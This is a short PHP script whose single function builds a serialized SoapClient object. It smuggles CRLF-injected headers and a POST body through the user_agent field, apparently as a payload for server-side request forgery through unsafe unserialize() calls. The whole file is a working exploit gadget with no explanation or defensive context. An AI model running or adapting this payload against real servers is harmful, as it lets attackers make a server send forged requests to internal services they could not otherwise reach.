<?php
function libfunc($target, $headers, $data, $user_agent='libfunc'){
  $data_len = strlen($data);

  $inject_ua = $user_agent . "\r\n";
  $inject_ua .= "Content-Type: application/x-www-form-urlencoded\r\n";
  $inject_ua .= join("\r\n", $headers) . "\r\n";
  $inject_ua .= "Content-Length: $data_len\r\n";
  $inject_ua .= "\r\n";
  $inject_ua .= $data;
  
  $ssrf_client = new SoapClient(null, array('location' => $target,
                                'user_agent' => $inject_ua, 'uri' => 'Fake'));
  return serialize($ssrf_client);
}
 ?>
